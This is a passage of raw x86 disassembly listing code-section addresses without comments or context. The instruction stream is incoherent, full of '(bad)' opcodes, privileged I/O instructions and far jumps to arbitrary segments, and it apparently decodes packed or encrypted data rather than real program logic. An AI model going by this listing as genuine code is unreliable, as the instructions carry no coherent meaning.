  402f64:	adc    ebp,DWORD PTR [edx]
  402f66:	test   eax,0xd0f54b9
  402f6b:	cld    
  402f6c:	sbb    ebp,edi
  402f6e:	inc    ebx
  402f6f:	inc    eax
  402f70:	mov    edi,DWORD PTR [edx+esi*2-0x61401356]
  402f77:	push   0x46cc25e2
  402f7c:	leave  
  402f7d:	loope  0x402f5b
  402f7f:	xchg   BYTE PTR [ecx+eiz*2-0x4991231d],dh
  402f86:	jb     0x402fab
  402f88:	iret   
  402f89:	ins    DWORD PTR es:[edi],dx
  402f8a:	ins    BYTE PTR es:[edi],dx
  402f8b:	cwde   
  402f8c:	ins    BYTE PTR es:[edi],dx
  402f8d:	shl    DWORD PTR [esi+0x6c16ddc1],cl
  402f93:	pop    edi
  402f94:	inc    ebx
  402f95:	add    eax,0x7853f258
  402f9a:	int3   
  402f9b:	adc    DWORD PTR [ecx],ebp
  402f9d:	push   ds
  402f9e:	daa    
  402f9f:	fdivr  QWORD PTR [esi+0xf]
  402fa2:	loopne 0x402ff6
  402fa4:	push   edx
  402fa5:	push   ds
  402fa6:	std    
  402fa7:	jmp    0xb6d7:0x414435b
  402fae:	sbb    esp,DWORD PTR [eax]
  402fb0:	sub    ebp,ebp
  402fb2:	pop    ss
  402fb3:	push   edi
  402fb4:	rol    DWORD PTR [edi+0x423de2f7],1
  402fba:	cmp    esi,DWORD PTR [ecx-0x52ccd596]
  402fc0:	mov    dl,0x17
  402fc2:	adc    DWORD PTR [ecx+0x76e993d0],ebp
  402fc8:	stos   BYTE PTR es:[edi],al
  402fc9:	cld    
  402fca:	xor    dh,bh
  402fcc:	nop
  402fcd:	addr16 loopne 0x402fed
  402fd0:	xlat   BYTE PTR ds:[ebx]
  402fd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd2:	or     BYTE PTR [ebp+ebx*1-0x2],al
  402fd6:	loope  0x402fbc
  402fd8:	adc    BYTE PTR [edi],al
  402fda:	ja     0x402f79
  402fdc:	out    dx,eax
  402fdd:	jmp    0x186f:0xc0505e5d
  402fe4:	cmp    esi,DWORD PTR [esi+0x54]
  402fe7:	(bad)  
  402fe8:	rcl    BYTE PTR [ebp-0x29c3e22d],1
  402fee:	in     al,0x88
  402ff0:	add    ebx,DWORD PTR [ebx+edi*2]
  402ff3:	mov    DWORD PTR [ecx],eax
  402ff5:	jmp    0x7beb:0x77bab6d9
  402ffc:	dec    ebx
  402ffd:	jbe    0x402fde
  402fff:	hlt    
  403000:	pop    esp
  403001:	xor    al,0x9f
  403003:	(bad)  
  403004:	cmc    
  403005:	int3   
  403006:	or     ebx,0x182cb3eb
  40300c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40300d:	leave  
  40300e:	sar    edi,1
  403010:	arpl   WORD PTR [ebx+0x10],di
  403013:	push   ss
  403014:	arpl   WORD PTR [eax-0x3e],bx
  403017:	dec    edi
  403018:	ja     0x402f9a
  40301a:	push   0xffffffdd
  40301c:	mov    edi,0x5175e7c9
  403021:	mov    bl,0x48
  403023:	sbb    BYTE PTR [esi+0x4d5e0b38],0xb7
  40302a:	rcr    BYTE PTR [edi-0x5e],cl
  40302d:	adc    eax,0x3e8d7bd5
  403032:	(bad)  
  403033:	sti    
  403034:	adc    BYTE PTR [eax+0x5d980d73],0x4e
  40303b:	inc    DWORD PTR [edi+esi*8-0x1d]
  40303f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403040:	mov    esp,DWORD PTR [ecx+0x2]
  403043:	add    eax,0x4a24593e
  403048:	pop    ss
  403049:	js     0x4030a4
  40304b:	loopne 0x4030b4
  40304d:	pop    ecx
  40304e:	pop    ebp
  40304f:	in     eax,0x4f
  403051:	cmp    cl,BYTE PTR [edi]
  403053:	pop    edx
  403054:	xor    esp,DWORD PTR [edx]
  403056:	pushaw 
  403058:	fnstcw WORD PTR [ecx-0xcf7639b]
  40305e:	or     ebx,DWORD PTR [ebp-0x7bade385]
  403064:	scas   eax,DWORD PTR es:[edi]
  403065:	rcl    DWORD PTR [ecx-0x57ce2851],1
  40306b:	jbe    0x4030cf
  40306d:	jecxz  0x403059
  40306f:	mov    ebp,0x88e9cde0
  403074:	mov    al,0x1c
  403076:	dec    esi
  403077:	test   eax,0x5ada5a15
  40307c:	sub    edi,esp
  40307e:	jmp    0x886:0xcfe950dd
  403085:	adc    DWORD PTR [ecx-0x5c],edi
  403088:	cmp    ah,BYTE PTR [esi+0x1c]
  40308b:	mov    ds:0x88afb1c,al
  403090:	inc    ebp
  403091:	xor    eax,0x71eec5ee
  403096:	xchg   esi,eax
  403097:	dec    esp
  403098:	mov    ecx,0x56b26b9e
  40309d:	in     eax,dx
  40309e:	push   ecx
  40309f:	je     0x403066
  4030a1:	or     DWORD PTR [ecx+0x5830d29a],edi
  4030a7:	cs stos BYTE PTR es:[edi],al
  4030a9:	cmp    BYTE PTR [eax+0x3f],ch
  4030ac:	and    cl,0x64
  4030af:	in     al,0xaf
  4030b1:	and    bh,dh
  4030b3:	(bad)  
  4030b4:	cdq    
  4030b5:	leave  
  4030b6:	icebp  
  4030b7:	xchg   ebx,eax
  4030b8:	int3   
  4030b9:	rol    ebp,0xfb
  4030bc:	mov    eax,ds:0xe1663259
  4030c1:	pop    es
  4030c2:	loop   0x403069
  4030c4:	mov    al,0x3e
  4030c6:	or     bh,BYTE PTR [ecx+0x40]
  4030c9:	sbb    dh,BYTE PTR [edi+0x621034fd]
  4030cf:	jl     0x4030ae
  4030d1:	mov    edx,0x3ee65f50
  4030d6:	mov    edx,0xbc68cdd6
  4030db:	rcl    BYTE PTR [eax],cl
  4030dd:	mov    ds:0x31b0b105,eax
  4030e2:	adc    eax,0xef87b5b4
  4030e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030e8:	(bad)
  4030eb:	jmp    0x4030aa
  4030ed:	int    0xe7
  4030ef:	jmp    0x465d407f
  4030f4:	out    dx,al
  4030f5:	add    dl,BYTE PTR [esi-0x1f]
  4030f8:	fwait
  4030f9:	mov    edx,0x1d690192
  4030fe:	push   edx
  4030ff:	(bad)  
  403100:	sub    eax,ebp
  403102:	mov    ebx,0x1f5cd168
  403107:	cmp    eax,0xfa582db0
  40310c:	out    dx,eax
  40310d:	int3   
  40310e:	clc    
  40310f:	inc    esi
  403110:	inc    ebp
  403111:	push   edx
  403112:	loope  0x4030dd
  403114:	xchg   ebp,eax
  403115:	cmp    bh,BYTE PTR [ecx-0x19129747]
  40311b:	sar    edi,cl
  40311d:	push   edi
  40311e:	imul   ebp,DWORD PTR [ecx],0x65
  403121:	mov    WORD PTR [ebp+ecx*2-0x615b55d6],gs
  403128:	and    esi,esi
  40312a:	or     al,0x1c
  40312c:	xlat   BYTE PTR ds:[ebx]
  40312d:	es data16 fwait
  403130:	dec    edi
  403131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403132:	stos   BYTE PTR es:[edi],al
  403133:	mov    DWORD PTR [edi+0x253510df],edi
  403139:	add    al,0x8e
  40313b:	dec    eax
  40313c:	les    esp,FWORD PTR [eax+ebp*1]
  40313f:	cmp    al,0x73
  403141:	sub    DWORD PTR [eax-0x2e],esp
  403144:	and    ebx,DWORD PTR ds:0x35c40b2
  40314a:	ins    BYTE PTR es:[edi],dx
  40314b:	les    ebp,FWORD PTR [edi-0x42]
  40314e:	mov    BYTE PTR [ebx-0x27749748],al
  403154:	stc    
  403155:	cmp    esp,DWORD PTR [ebx+eax*1]
  403158:	fwait
  403159:	jns    0x4031d4
  40315b:	cmp    BYTE PTR [ebx-0x4c],ch
  40315e:	pop    esi
  40315f:	outs   dx,BYTE PTR ds:[esi]
  403160:	shr    cl,0x44
  403163:	push   DWORD PTR ds:0x6a97099a
  403169:	scas   al,BYTE PTR es:[edi]
  40316a:	lock je 0x4031c7
  40316d:	clc    
  40316e:	pop    ebp
  40316f:	inc    eax
  403170:	loop   0x40310d
  403172:	pop    ebx
  403173:	jge    0x403190
  403175:	mov    edx,DWORD PTR [esi-0x60e95ac5]
  40317b:	les    edi,FWORD PTR [edx]
  40317d:	and    DWORD PTR [esi],ebx
  40317f:	(bad)  
  403181:	mov    eax,ds:0xf0d92baf
  403186:	repnz or DWORD PTR [ecx+edi*8-0x5b597876],ebp
  40318e:	retf   
  40318f:	mov    ds:0x551ffe7d,eax
  403194:	or     eax,DWORD PTR [edi]
  403196:	dec    edx
  403197:	inc    ecx
  403198:	xor    eax,DWORD PTR [esi+edx*8+0xec85858]
  40319f:	cmp    eax,0x6a80a8d3
  4031a4:	jo     0x403208
  4031a6:	shl    BYTE PTR [esi-0x6af6b104],cl
  4031ac:	xchg   esi,eax
  4031ad:	(bad)  
  4031ae:	bound  ebp,QWORD PTR [edi+eiz*8]
  4031b1:	retf   0x9169
  4031b4:	jno    0x4031b0
  4031b6:	les    ebx,FWORD PTR [edi+edi*2]
  4031b9:	dec    ecx
  4031ba:	mov    edx,0x1569986c
  4031bf:	loopne 0x403213
  4031c1:	sbb    bl,BYTE PTR [edx-0x38]
  4031c4:	cmp    eax,0x47895fb5
  4031c9:	pop    es
  4031ca:	pop    ecx
  4031cb:	xchg   DWORD PTR [edx-0x420c7d9c],ebx
  4031d1:	in     eax,dx
  4031d2:	ja     0x4031bd
  4031d4:	push   eax
  4031d5:	popa   
  4031d6:	retf   0x3bc8
  4031d9:	(bad)  
  4031da:	push   es
  4031db:	nop
  4031dc:	lahf   
  4031dd:	scas   eax,DWORD PTR es:[edi]
  4031de:	jno    0x403225
  4031e0:	dec    ebx
  4031e1:	pop    ss
  4031e2:	out    0x5e,al
  4031e4:	out    0x35,eax
  4031e6:	in     eax,dx
  4031e7:	jle    0x40323c
  4031e9:	inc    ecx
  4031ea:	mov    ah,0x1e
  4031ec:	jge    0x403192
  4031ee:	rcl    BYTE PTR [edi-0x5ce6cb68],1
  4031f4:	cli    
  4031f5:	mov    esp,0x495f1afb
  4031fa:	(bad)  
  4031fb:	sub    BYTE PTR [eax+eiz*4+0x722dcd4d],cl
  403202:	aaa    
  403203:	loopne 0x40324d
  403205:	sub    al,BYTE PTR [eax+0x8c40671]
  40320b:	retf   0xd5a9
  40320e:	mov    ebp,0xe888bf82
  403213:	(bad)  
  403214:	jmp    0x403254
  403216:	sahf   
  403217:	cs cmc 
  403219:	cmp    eax,0x9586bd83
  40321e:	aad    0x76
  403220:	mov    al,ds:0x1ce5900c
  403225:	aam    0x6d
  403227:	and    ah,ah
  403229:	or     al,0xff
  40322b:	loope  0x4031d2
  40322d:	jae    0x162b03ac
  403233:	sub    al,0x4f
  403235:	cmp    eax,0xc2da50ec
  40323a:	jb     0x40325e
  40323c:	pop    edx
  40323d:	daa    
  40323e:	xchg   esp,eax
  40323f:	scas   al,BYTE PTR es:[edi]
  403240:	mov    cl,0xce
  403242:	lods   eax,DWORD PTR ds:[esi]
  403243:	push   ebp
  403244:	push   esp
  403245:	(bad)  
  403246:	(bad)  
  403248:	ficom  WORD PTR [edx-0x37]
  40324b:	sbb    BYTE PTR [ecx],ch
  40324d:	pop    edx
  40324e:	push   ecx
  40324f:	add    eax,0x4a9c0dff
  403254:	fisub  DWORD PTR ds:0x85f5c73d
  40325b:	loope  0x4032a8
  40325d:	daa    
  40325e:	cmp    dl,BYTE PTR [edi]
  403260:	jne    0x403289
  403262:	mov    ebp,0x350c50c0
  403267:	sbb    DWORD PTR ds:0x319aac21,ecx
  40326d:	cmp    eax,esp
  40326f:	mov    eax,ds:0x74bee04c
  403274:	cmp    DWORD PTR [edi-0x6ad8deea],ebx
  40327a:	outs   dx,BYTE PTR ds:[esi]
  40327b:	into   
  40327c:	fistp  WORD PTR [eax-0x41]
  40327f:	loopne 0x403268
  403281:	dec    esi
  403282:	jle    0x4032e1
  403284:	xor    DWORD PTR [esi+ebx*4-0x3cf78de],edx
  40328b:	sub    al,0x27
  40328d:	cmp    eax,0xd8c85430
  403292:	push   ecx
  403293:	mov    bh,BYTE PTR [edi-0x50]
  403296:	stos   DWORD PTR es:[edi],eax
  403297:	aas    
  403298:	push   0xffffffc1
  40329a:	inc    edi
  40329b:	ret    
  40329c:	repnz out dx,eax
  40329e:	enter  0x1555,0xa1
  4032a2:	or     dl,BYTE PTR [edx]
  4032a4:	mov    ecx,0xb8ebd8cc
  4032a9:	sub    BYTE PTR [ebx+0x4a606db8],al
  4032af:	repnz mov cl,BYTE PTR [esi]
  4032b2:	or     eax,0x86682beb
  4032b7:	scas   al,BYTE PTR es:[edi]
  4032b8:	jge    0x40324a
  4032ba:	sbb    esi,edi
  4032bc:	push   edx
  4032bd:	aad    0x1e
  4032bf:	jl     0x4032d0
  4032c1:	mov    esp,0x7b0158f
  4032c6:	or     bl,ch
  4032c8:	jg     0x403261
  4032ca:	jecxz  0x4032b0
  4032cc:	dec    eax
  4032cd:	adc    ebx,ecx
  4032cf:	ja     0x403342
  4032d1:	jmp    0xc96fd410
  4032d6:	retf   0x4d60
  4032d9:	push   ecx
  4032da:	inc    ecx
  4032db:	xchg   ebp,eax
  4032dc:	dec    ebx
  4032dd:	mov    ah,0x4c
  4032df:	ret    0x6847
  4032e2:	or     eax,ebp
  4032e4:	(bad)  
  4032e6:	pop    ebp
  4032e7:	mov    DWORD PTR ds:[ebx-0x41],ecx
  4032eb:	sbb    eax,0x9a3516ad
  4032f0:	out    0x1b,al
  4032f2:	frstor [esi+0x3071ecfc]
  4032f8:	xchg   edx,eax
  4032f9:	pop    es
  4032fa:	jmp    0x6f75aaf9
  4032ff:	jae    0x4032aa
  403301:	mov    DWORD PTR [esi-0x77dd910e],ebp
  403307:	stos   BYTE PTR es:[edi],al
  403308:	mov    dl,BYTE PTR [edi]
  40330a:	xor    bh,BYTE PTR [eax-0x44]
  40330d:	mov    cl,ch
  40330f:	aaa    
  403310:	sub    BYTE PTR [esi+0x6c],cl
  403313:	cmp    edx,DWORD PTR [esi]
  403315:	mov    BYTE PTR [edi+0x61],ah
  403318:	add    esi,ebp
  40331a:	mov    al,ds:0x7e225490
  40331f:	add    eax,0x8146f3b6
  403324:	repnz mov bh,0xbc
  403327:	push   0xe
  403329:	out    dx,eax
  40332a:	mov    bl,0xed
  40332c:	or     edi,DWORD PTR [edx]
  40332e:	cld    
  40332f:	pop    esi
  403330:	or     eax,0x1e1e27ed
  403335:	mov    BYTE PTR [edx],0xd4
  403338:	das    
  403339:	xchg   esi,eax
  40333a:	cwde   
  40333b:	add    BYTE PTR [ebp-0x1929e47a],ch
  403341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403342:	test   BYTE PTR [edi-0xb],dl
  403345:	jle    0x4032eb
  403347:	xchg   ebx,eax
  403348:	mov    esi,0x6dd1010d
  40334d:	hlt    
  40334e:	fs mov bl,0x35
  403351:	jp     0x4033ca
  403353:	es push 0x6ecf7072
  403359:	xchg   edi,eax
  40335a:	jns    0x40338b
  40335c:	pop    ss
  40335d:	push   0xeacc58bd
  403362:	fwait
  403363:	inc    esi
  403364:	add    edx,DWORD PTR [edx]
  403366:	pop    ds
  403367:	in     al,0xc0
  403369:	fsub   st,st(6)
  40336b:	sub    ebx,ebp
  40336d:	imul   ebp,DWORD PTR [edi-0x147e6ef8],0x7e54fd01
  403377:	les    ebp,FWORD PTR [ebx+eiz*2-0x781fc9bf]
  40337e:	or     ah,dl
  403380:	xchg   ebx,eax
  403381:	stos   DWORD PTR es:[edi],eax
  403382:	repnz dec ecx
  403384:	inc    ebp
  403385:	(bad)  
  403386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403387:	ficomp WORD PTR [edx-0x6e9745f5]
  40338d:	test   DWORD PTR [ebx+0x35],ebp
  403390:	neg    BYTE PTR [ecx]
  403392:	je     0x4033dc
  403394:	and    eax,0x45a32e7c
  403399:	mov    al,ds:0x2a34e24b
  40339e:	test   al,0xa0
  4033a0:	scas   eax,DWORD PTR es:[edi]
  4033a1:	xchg   esp,eax
  4033a2:	in     al,dx
  4033a3:	pop    edi
  4033a4:	xor    DWORD PTR [ecx],ecx
  4033a6:	lods   al,BYTE PTR ds:[esi]
  4033a7:	out    dx,al
  4033a8:	xor    ebx,DWORD PTR [ebp+ecx*1-0x6e]
  4033ac:	xchg   edi,eax
  4033ad:	idiv   ecx
  4033af:	mov    ebp,0x777792e2
  4033b4:	bound  ecx,QWORD PTR [ecx]
  4033b6:	push   edx
  4033b7:	mov    bh,0xf7
  4033b9:	cmp    esp,DWORD PTR [ecx]
  4033bb:	inc    ecx
  4033bc:	test   BYTE PTR [edi-0x46557ba9],0xfa
  4033c3:	or     al,0xa4
  4033c5:	xchg   edx,eax
  4033c6:	sbb    al,0x23
  4033c8:	mov    eax,ss
  4033ca:	or     eax,0x97bd2d46
  4033cf:	repnz fsub QWORD PTR [ebx*8+0x35bd1ad0]
  4033d7:	xchg   ebp,eax
  4033d8:	xor    ah,BYTE PTR [edi+eax*8]
  4033db:	stos   BYTE PTR es:[edi],al
  4033dc:	pop    ebx
  4033dd:	test   al,0xf3
  4033df:	out    dx,al
  4033e0:	jp     0x4033c8
  4033e2:	mov    eax,ds:0xb1fa6a5c
  4033e7:	dec    ecx
  4033e8:	pop    es
  4033e9:	adc    edx,DWORD PTR [eax+0x72]
  4033ec:	pop    es
  4033ed:	add    ch,BYTE PTR [edi+0xcc9bbdd]
  4033f3:	hlt    
  4033f4:	stos   BYTE PTR es:[edi],al
  4033f5:	xor    BYTE PTR [ecx-0x72fa3ec2],0xf2
  4033fc:	retw   
  4033fe:	xor    BYTE PTR [eax+0x25],ch
  403401:	jg     0x403388
  403403:	int3   
  403404:	ss test dh,dh
  403407:	in     eax,0x31
  403409:	int3   
  40340a:	sbb    BYTE PTR [ecx+0x6e],ch
  40340d:	sbb    eax,0x65b290c6
  403412:	mov    ebx,esp
  403414:	ds and esp,ecx
  403417:	test   DWORD PTR [edi+ecx*1+0x69],ebp
  40341b:	fld    QWORD PTR [ebx]
  40341d:	pop    es
  40341e:	jbe    0x40341a
  403420:	jb     0x403438
  403422:	rol    esi,cl
  403424:	inc    ecx
  403425:	dec    eax
  403426:	(bad)  
  403427:	cmp    al,0xb0
  403429:	mov    edi,0xfa53880d
  40342e:	or     al,BYTE PTR [esi+edi*8-0x36]
  403432:	bnd jle 0x403422
  403435:	xchg   ecx,eax
  403436:	or     dh,ah
  403438:	bound  edx,QWORD PTR [ebp+0x4394120d]
  40343e:	sbb    esi,DWORD PTR [eax]
  403440:	xor    DWORD PTR [ebp-0x28],0x2a
  403444:	sbb    al,0x5a
  403446:	aam    0xfb
  403448:	(bad)  
  403449:	call   ebp
  40344b:	dec    edx
  40344c:	sbb    al,BYTE PTR [ebx-0x27]
  40344f:	push   ebx
  403450:	leave  
  403451:	xor    BYTE PTR [edi],al
  403453:	sub    esp,DWORD PTR [ebx]
  403455:	add    eax,0x7c80c87f
  40345a:	xchg   edx,eax
  40345b:	inc    edx
  40345c:	push   edi
  40345d:	pop    esp
  40345e:	int3   
  40345f:	jb     0x4034de
  403461:	ins    DWORD PTR es:[edi],dx
  403462:	fdiv   DWORD PTR [ebp+esi*2+0x690cf029]
  403469:	and    dl,BYTE PTR [ecx+0x3404a062]
  40346f:	repz call 0xfb24:0xabc73180
  403477:	(bad)  
  403478:	jno    0x4034ac
  40347a:	pop    ebx
  40347b:	ret    
  40347c:	cwde   
  40347d:	hlt    
  40347e:	retf   
  40347f:	out    dx,al
  403480:	scas   eax,DWORD PTR es:[edi]
  403481:	mov    eax,0x796a3419
  403486:	jmp    0x1bf93e86
  40348b:	les    esi,FWORD PTR [ebx]
  40348d:	mov    ch,0xb1
  40348f:	dec    edi
  403490:	xchg   ebp,eax
  403491:	in     al,0x95
  403493:	maskmovq mm1,(bad)
  403494:	test   DWORD PTR [eax],0xdbf76b9a
  40349a:	aas    
  40349b:	or     BYTE PTR [ebx-0x5f],ch
  40349e:	xor    esi,DWORD PTR [ebp+ebx*8+0x30]
  4034a2:	xor    DWORD PTR [esi+0x5ea761e2],edi
  4034a8:	leave  
  4034a9:	stc    
  4034aa:	inc    ebp
  4034ab:	repz sub ecx,DWORD PTR [esi+0x7]
  4034af:	mov    db7,esp
  4034b2:	cmp    edi,DWORD PTR [eax+0x51199e03]
  4034b8:	retf   
  4034b9:	mov    al,0x40
  4034bb:	pop    edx
  4034bc:	add    DWORD PTR [esp+eiz*4+0x10182389],edx
  4034c3:	adc    eax,0x608ba9d3
  4034c8:	cmp    al,0xcd
  4034ca:	bound  ecx,QWORD PTR [edi-0x2e]
  4034cd:	jmp    0x90478a32
  4034d2:	rcr    esp,1
  4034d4:	loop   0x403478
  4034d6:	jbe    0x403469
  4034d8:	mov    eax,ds:0x2bf5ca2e
  4034dd:	mov    esi,ecx
  4034df:	out    dx,al
  4034e0:	shl    DWORD PTR [esi],cl
  4034e2:	lahf   
  4034e3:	add    DWORD PTR [ecx-0xf],eax
  4034e6:	mov    BYTE PTR [edi],al
  4034e8:	fwait
  4034e9:	sub    bh,dl
  4034eb:	cs pushf 
  4034ed:	ss leave 
  4034ef:	cmp    BYTE PTR [edi-0x14747777],0x17
  4034f6:	outs   dx,DWORD PTR ds:[esi]
  4034f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034f8:	dec    esi
  4034f9:	jle    0x40349f
  4034fb:	jns    0x4034e0
  4034fd:	push   es
  4034fe:	in     eax,0x9f
  403500:	cwde   
  403501:	mov    ecx,0x398f0bb9
  403506:	inc    edi
  403507:	pop    esp
  403508:	cmp    eax,0x9ba04dc
  40350d:	arpl   WORD PTR [eax+0x3],ax
  403510:	jle    0x4034ce
  403512:	bound  ebp,QWORD PTR [esi+0x628d72bf]
  403518:	ret    
  403519:	js     0x403582
  40351b:	or     edi,ecx
  40351d:	bound  edx,QWORD PTR [esi-0x1b6baad4]
  403523:	pop    ds
  403524:	int3   
  403525:	ja     0x403534
  403527:	sbb    edi,DWORD PTR [ecx]
  403529:	adc    al,0x2e
  40352b:	inc    DWORD PTR [ecx-0x20d18986]
  403531:	jmp    0xf9b43d8d
  403536:	xchg   edx,eax
  403537:	fadd   DWORD PTR [ebp-0xfb4eaae]
  40353d:	std    
  40353e:	jbe    0x403506
  403540:	pop    ss
  403541:	or     eax,0x8e75cdae
  403546:	mul    DWORD PTR [ebp+0x77]
  403549:	aad    0x31
  40354b:	mov    eax,0x6dfae094
  403550:	xor    ebx,DWORD PTR [edx-0x37]
  403553:	sub    BYTE PTR [eax-0xf333279],bl
  403559:	mov    WORD PTR gs:[edx-0x18a81cb2],?
  403560:	jne    0x4034ea
  403562:	sub    BYTE PTR [edi],al
  403564:	mov    esi,0x963a035e
  403569:	idiv   BYTE PTR [ecx]
  40356b:	ins    BYTE PTR es:[edi],dx
  40356c:	or     BYTE PTR [edx],ah
  40356e:	fidivr WORD PTR [esi]
  403570:	(bad)  
  403571:	mov    cl,ch
  403573:	into   
  403574:	ror    WORD PTR [ecx],cl
  403577:	into   
  403578:	adc    esi,DWORD PTR [ebx+0x7bc2ab81]
  40357e:	adc    DWORD PTR ds:0xc8f5362a,edx
  403584:	ret    0x9242
  403587:	add    eax,0x95756642
  40358c:	add    al,0x2a
  40358e:	inc    ecx
  40358f:	mov    ds:0x8622828b,eax
  403594:	and    al,0x4e
  403596:	scas   eax,DWORD PTR es:[edi]
  403597:	ins    DWORD PTR es:[edi],dx
  403598:	inc    ebx
  403599:	mov    ebp,0x56b978db
  40359e:	cmp    BYTE PTR [esi-0x4b9fad4],0x63
  4035a5:	fdivr  DWORD PTR [esi-0x4d]
  4035a8:	ds daa 
  4035aa:	adc    esi,DWORD PTR [edx+0x75f39aaf]
  4035b0:	or     dh,al
  4035b2:	mov    ds:0xb329ebeb,al
  4035b7:	xor    al,0xc7
  4035b9:	aaa    
  4035ba:	sbb    BYTE PTR [ecx+0x30],dl
  4035bd:	fcom   QWORD PTR ds:0x5b2ecf18
  4035c3:	pop    ebx
  4035c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035c5:	aas    
  4035c6:	aaa    
  4035c7:	pushf  
  4035c8:	mov    ds:0x9443e2a9,eax
  4035cd:	repnz xor ecx,esi
  4035d0:	enter  0x6a3b,0xaf
  4035d4:	add    eax,0xfbce691a
  4035d9:	fwait
  4035da:	dec    ecx
  4035db:	lods   eax,DWORD PTR ds:[esi]
  4035dc:	pusha  
  4035dd:	push   ebx
  4035de:	ficomp WORD PTR gs:[ecx+0xa]
  4035e2:	sub    eax,0xb4758782
  4035e7:	push   0x1c
  4035e9:	inc    ebp
  4035ea:	bound  eax,QWORD PTR [ebp-0x5b]
  4035ed:	aad    0x73
  4035ef:	push   edi
  4035f0:	ret    0x18b9
  4035f3:	ror    dl,cl
  4035f5:	push   cs
  4035f6:	cmp    al,0xe6
  4035f8:	ds push eax
  4035fa:	adc    edi,DWORD PTR [edi]
  4035fc:	int3   
  4035fd:	dec    edi
  4035fe:	push   ebx
  4035ff:	stc    
  403600:	jge    0x4035c9
  403602:	test   BYTE PTR [edi+ecx*8-0x2c],dl
  403606:	mov    dl,0x9f
  403608:	push   edi
  403609:	pop    ebp
  40360a:	jmp    0x4035f3
  40360c:	xchg   esp,eax
  40360d:	mov    eax,eax
  40360f:	add    BYTE PTR [edi-0x189b1278],cl
  403615:	ftst   
  403617:	push   cs
  403618:	aam    0xaf
  40361a:	dec    edx
  40361b:	cld    
  40361c:	or     DWORD PTR [esi+0x73],edx
  40361f:	int3   
  403620:	pop    esp
  403621:	ins    BYTE PTR es:[edi],dx
  403622:	jl     0x403637
  403624:	jecxz  0x4035e4
  403626:	xor    edi,DWORD PTR [edx+eiz*8]
  403629:	(bad)  
  40362a:	jmp    0xb881:0x8a068bd4
  403631:	in     al,dx
  403632:	mov    ebx,0xad35233d
  403637:	fs push ebp
  403639:	scas   eax,DWORD PTR es:[edi]
  40363a:	mov    edi,0x47a30892
  40363f:	add    esp,DWORD PTR [ebx+0x11]
  403642:	adc    al,0x58
  403644:	cmp    ch,BYTE PTR [ebx]
  403646:	push   esi
  403647:	push   0xd0ba795e
  40364c:	icebp  
  40364d:	cmp    esp,DWORD PTR [ebp-0x39]
  403650:	ins    BYTE PTR es:[edi],dx
  403651:	gs inc esi
  403653:	adc    edi,DWORD PTR gs:[ebp-0x70]
  403657:	adc    edx,ebx
  403659:	push   0xffffffe5
  40365b:	test   cl,bh
  40365d:	rcl    DWORD PTR [edi+0x69],1
  403660:	enter  0xe0cc,0xa2
  403664:	scas   al,BYTE PTR es:[edi]
  403665:	or     edx,DWORD PTR [edi]
  403667:	lahf   
  403668:	push   ss
  403669:	mov    esi,0x8800a0d1
  40366e:	push   ebp
  40366f:	xchg   ecx,eax
  403670:	cwde   
  403671:	mov    bl,0xaf
  403673:	sub    BYTE PTR [ecx],dl
  403675:	sub    DWORD PTR [esi],edi
  403677:	xchg   esp,eax
  403678:	xlat   BYTE PTR ds:[ebx]
  403679:	rol    BYTE PTR [ebp-0x58],1
  40367c:	sub    eax,0xa214bc2c
  403681:	fcompp 
  403683:	bound  ebx,QWORD PTR [ebx+0xd]
  403686:	or     eax,0x74bdeaef
  40368b:	sbb    ebp,esp
  40368d:	sar    DWORD PTR [ecx],0x64
  403690:	(bad)  
  403691:	shl    BYTE PTR [edi],1
  403693:	dec    edx
  403694:	outs   dx,BYTE PTR ds:[esi]
  403695:	mov    ds:0x475f912a,al
  40369a:	adc    edi,DWORD PTR [eax-0x78]
  40369d:	lds    ebx,FWORD PTR [ecx]
  40369f:	mov    ebp,edi
  4036a1:	sbb    edx,DWORD PTR [ecx]
  4036a3:	clc    
  4036a4:	sbb    dh,BYTE PTR [esi]
  4036a6:	jp     0x403653
  4036a8:	or     ebx,DWORD PTR [ebp-0x4f2abe6d]
  4036ae:	inc    edi
  4036af:	cs sti 
  4036b1:	loopne 0x403714
  4036b3:	xor    DWORD PTR [edi+eiz*4],0xffffffda
  4036b7:	hlt    
  4036b8:	xor    ebp,eax
  4036ba:	jo     0x4036a3
  4036bc:	add    DWORD PTR [ebx+0x5],0xdf43a575
  4036c3:	popa   
  4036c4:	(bad)  [edx]
  4036c6:	sti    
  4036c7:	pop    ss
  4036c8:	in     eax,dx
  4036c9:	mov    al,0x67
  4036cb:	leave  
  4036cc:	xchg   edi,eax
  4036cd:	mov    ah,0x7
  4036cf:	dec    esi
  4036d0:	loop   0x4036c3
  4036d2:	xchg   BYTE PTR [edx-0x28],dh
  4036d5:	stc    
  4036d6:	push   DWORD PTR [eax-0x7a1ffca8]
  4036dc:	lods   al,BYTE PTR ds:[esi]
  4036dd:	lahf   
  4036de:	push   ebx
  4036df:	jmp    0x125c:0x5c8cf132
  4036e6:	jmp    0xde34:0xb61d5ac8
  4036ed:	pop    esp
  4036ee:	jo     0x403766
  4036f0:	hlt    
  4036f1:	mov    ds:0xda122158,eax
  4036f6:	xchg   edi,eax
  4036f7:	clc    
  4036f8:	or     BYTE PTR [eax-0x42],dl
  4036fb:	cs add eax,0x6496a7b8
  403701:	test   eax,0xe093444
  403706:	inc    esp
  403707:	int    0x3d
  403709:	push   ds
  40370a:	fadd   QWORD PTR [ecx+0x51adf1e4]
  403710:	mov    ah,0x1b
  403712:	jg     0x40371f
  403714:	sub    ah,BYTE PTR [edi]
  403716:	ror    bh,cl
  403718:	lahf   
  403719:	gs pop ebx
  40371b:	push   esp
  40371c:	pop    ss
  40371d:	mov    ecx,0xb21caa9c
  403722:	fbld   TBYTE PTR [eax+0x22b2584e]
  403728:	jno    0x4036b5
  40372a:	mov    edi,DWORD PTR [eax+0x2fd10840]
  403730:	inc    ebx
  403731:	jae    0x4036ea
  403733:	std    
  403734:	icebp  
  403735:	lods   al,BYTE PTR ds:[esi]
  403736:	add    DWORD PTR [edi+eax*4+0x1eba0779],edi
